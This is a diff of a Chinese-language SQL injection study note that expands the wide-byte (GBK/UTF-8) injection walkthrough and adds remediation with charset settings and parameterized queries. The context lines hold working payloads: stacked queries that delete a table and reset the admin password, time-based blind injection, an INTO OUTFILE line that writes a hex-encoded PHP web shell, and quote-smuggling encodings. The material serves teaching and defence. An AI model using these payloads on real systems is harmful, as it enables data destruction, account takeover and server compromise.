@@ -30,7 +30,7 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
 堆叠查询(stacked queries)原理:通过分号分隔 实现执行多条SQL语句
 
 * 无害验证payload - 验证该漏洞是否存在
-  * 删除数据 MySQL `SELECT * FROM products WHERE productid=1; select sleep(3)`
+  * 延迟时间 MySQL `SELECT * FROM products WHERE productid=1; select sleep(3)`
 * 攻击利用payload - 利用该漏洞"执行SQL语句" 操作数据
   * 删除数据 MySQL `SELECT * FROM products WHERE productid=1; DELETE FROM products`
   * 修改数据 MySQL `SELECT * FROM products WHERE categoryid=1; UPDATE members SET password='pwd' WHERE username='admin'`
@@ -204,9 +204,7 @@ concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
 SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/s.php' LINES TERMINATED BY 0x3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e;
 ```
 
-#### 宽字节注入
-
-##### 情况1 数据库使用了GBK编码
+#### 宽字节注入 - 情况1 数据库使用了GBK编码
 
 |字符|URL编码|描述|
 |:-------------:|--|-----|
@@ -233,25 +231,35 @@ SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/s.php' LINES TE
 
 自动化:使用sqlmap的tamper脚本`--tamper "unmagicquotes.py"` 进行自动转换 `%27` -> `%df%27`
 
-##### 情况2 数据库使用了UTF-8编码
+#### 宽字节注入 - 情况2 数据库使用了UTF-8编码
 
-|字符|UTF8编码|GBK编码|
-|:-------------:|--|-----|
-|錦|0xe98ca6|0xe55c|
+|字符|UTF-8 (hex)|URL Escape Code|GBK编码|Unicode Code Point|
+|:-------------:|--|--|--|-----|
+|錦|e98ca6(0xE9 0x8C 0xA6)|%E9%8C%A6|0xe55c|	\u9326 |
 
 
-如果数据库使用了UTF-8字符集`set names UTF-8`
-  * 输入 - 将payload中的单引号`%27`都替换为`%e5%5c%27` 以便利用宽字节特性绕过转义
+* 测试过程(数据库使用了UTF-8字符集`set names UTF-8`)
+  * 输入 - 将payload中的单引号`%27`都替换为`%e5%5c%27` 以便后续利用宽字节特性绕过转义
   * 转义 - 输入的数据`%e5%5c%27` 经过addslashes函数转义(反斜杠被反斜杠转义) 变为`%e5%5c%5c%27`
-  * 编码转换逻辑 - 为了使得SQL语句中的字符集一致为UTF-8，web应用程序会将用户输入的GBK字符转为UTF-8字符，转换函数 `iconv`或`mb_convert_encoding` 
-  * 编码转换 - 将GBK字符`%e5%5c%5c%27`经过转换得到 `%e9%8c%a6%5c%5c%27`  从前向后解析 因为`%e9%8c%a6`为UTF字符`錦`
-  * 执行 - `錦\\'` 使单引号不再是字符(数据) 能够改变SQL语句(代码)
+  * 编码转换逻辑 - 为了使得SQL语句中的字符统一都是UTF-8编码的，web应用程序会将用户输入的GBK字符转为UTF-8字符，转换函数 `iconv`或`mb_convert_encoding` 
+  * 编码转换 - GBK字符`%e5%5c%5c%27` 转换得到  UTF-8字符 `%e9%8c%a6%5c%5c%27`  从前向后解析 因为`%e9%8c%a6`为UTF字符`錦`
+  * 执行 - 语句中是 `錦\\'` 可见单引号不再是字符(数据) 能够改变SQL语句(代码)
+
+* 宽字节注入的修复方案
+  * PHP 5 >= 5.2.3 - 使用 `mysql_set_charset`[php自带函数](https://www.php.net/manual/zh/function.mysql-set-charset.php)设置客户端的字符集(这是改变字符集的最佳方式)，并使用`mysql_real_escape_string`函数进行转义(此函数会考虑当前设置的字符集 不会出现宽字节注入)
+  * PHP 7 - 移除了`mysql_set_charset`函数 只能通过以下2个扩展进行设置
+    * 使用MySQLi扩展 `mysqli_character_set_name()`函数
+    * 使用PDO: 添加 charset 到连接字符串 如`charset=utf8`
 
 ### SDL - 防御与修复方案
 
 * 1.使用带有"参数化查询"的"预编译语句"
 
-"参数化查询"(Parameterized Query 或 Parameterized Statement)的原理:强制开发人员先定义好所有SQL代码，然后将每个"实际参数"传入并查询。这种编码风格使数据库能够区分"代码"和"数据".
+"参数化查询"(Parameterized Query / Parameterized Statement)的原理:强制开发人员预先定义好所有SQL语句(留空待填) 应用程序将"实际参数"传入并查询.
+
+这种编码风格使数据库能够区分"代码"和"数据".
+
+不同语言的防御方案如下.
 
 PHP - Laravel框架的 Eloquent ORM
 
@@ -278,7 +286,7 @@ var_dump($row);
 }
 ```
 
-PHP - 使用MySQLi (仅支持MySQL数据库)
+PHP - 使用MySQLi扩展 (仅支持MySQL数据库)
 ```
 $stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');
 $stmt->bind_param('s', $name);
@@ -386,9 +394,12 @@ package main
 
 * 2. 存储过程
 
-存储过程的安全性和预编译语法相同。
-存储过程是用"SQL代码"定义和存储在数据库中的，使用时被应用程序调用。
-如果使用了存储过程，开发者应该避免在存储过程中生成不安全的动态SQL查询语句。
+存储过程的安全性高，和预编译语句相同
+
+存储过程使用的"SQL代码"定义和存储在数据库中，使用时被应用程序调用
+
+如果使用了存储过程，开发者必须避免在存储过程中生成"不安全的动态SQL查询语句"
+
 ```
 //JAVA中使用存储过程，该存储过程已经定义在数据库中:
 String custname = request.getParameter("customerName");
